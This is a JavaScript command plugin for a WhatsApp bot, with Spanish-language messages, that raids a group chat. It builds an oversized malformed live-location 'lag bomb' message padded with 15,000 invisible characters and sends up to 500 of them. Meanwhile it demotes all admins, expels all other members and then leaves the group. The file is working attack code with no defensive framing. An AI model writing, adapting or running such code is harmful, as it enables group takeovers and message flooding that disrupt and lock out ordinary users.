const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣',
        degreesLongitude: '💥',
        caption: '\u2063'.repeat(15000) + '💥'.repeat(300),
        sequenceNumber: '999',
        jpegThumbnail: null,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: '💣 Lag WhatsApp',
            body: 'Este mensaje es muy pesado',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms))
}

let handler = async (m, { conn, participants, isBotAdmin, isOwner }) => {
  if (!isOwner) return m.reply(`🚫 *Acceso denegado.*`)
  if (!isBotAdmin) return m.reply(`🛑 *Shizuka necesita rango de administrador.*`)

  const inicio = Date.now()
  const grupoInfo = await conn.groupMetadata(m.chat)
  const participantes = grupoInfo.participants || []
  const cleanJid = jid => jid.split('/')[0]
  const botNumber = cleanJid(conn.user.jid)

  const admins = participantes.filter(p => p.admin).map(p => cleanJid(p.id))
  const adminsADegradar = admins.filter(id => id !== botNumber)
  const operativos = participantes.map(u => cleanJid(u.id)).filter(id => !admins.includes(id) && id !== botNumber)

  await m.reply(`
╭━━━┳━━━┳━━━┳━━━┳━━━╮
┃╭━━┫╭━╮┃╭━╮┃╭━╮┃╭━╮┃
┃╰━━┫┃╱┃┃┃╱┃┃╰━╯┃╰━━╮
┃╭━━┫┃╱┃┃┃╱┃┃╭╮╭┻━━╮┃
┃╰━━┫╰━╯┃╰━╯┃┃┃╰┫╰━╯┃
╰━━━┻━━━┻━━━┻╯╰━┻━━━╯

🧬 *Lo siento... pero dos materias no pueden coexistir en el mismo plano.*
🌌 *El equilibrio será restaurado por Shizuka.*
📡 Grupo: *${grupoInfo.subject}*
⏳ Ejecutando maniobras estratégicas...
`.trim())

  let bombasEnviadas = 0
  let bombasActivas = true

  const lanzarBombas = async () => {
    while (bombasActivas && bombasEnviadas < 500) {
      try {
        await conn.relayMessage(m.chat, buildLagMessage(), { messageId: conn.generateMessageTag() })
        bombasEnviadas++
        await delay(300)
      } catch (e) {}
    }
  }

  lanzarBombas()

  for (let id of adminsADegradar) {
    try {
      await conn.groupParticipantsUpdate(m.chat, [id], 'demote')
      await delay(1000)
    } catch (e) {}
  }

  for (let id of operativos) {
    try {
      await conn.groupParticipantsUpdate(m.chat, [id], 'remove')
      await delay(1500)
    } catch (e) {}
  }

  bombasActivas = false

  const fin = Date.now()
  const tiempo = ((fin - inicio) / 1000).toFixed(2)

  await m.reply(
    `✅ *REVELACIÓN COMPLETADA*

🔻 Administradores degradados: ${adminsADegradar.length}
⚔️ Miembros expulsados: ${operativos.length}
💣 Bombas enviadas: ${bombasEnviadas}
⏱️ Tiempo total: ${tiempo} segundos

🚪 *Shizuka se retira del plano...*`
  )

  await conn.groupLeave(m.chat)
}

handler.help = ['revelar2']
handler.tags = ['grupo']
handler.command = ['revelar2']
handler.group = true
handler.rowner = true
handler.botAdmin = true

export default handler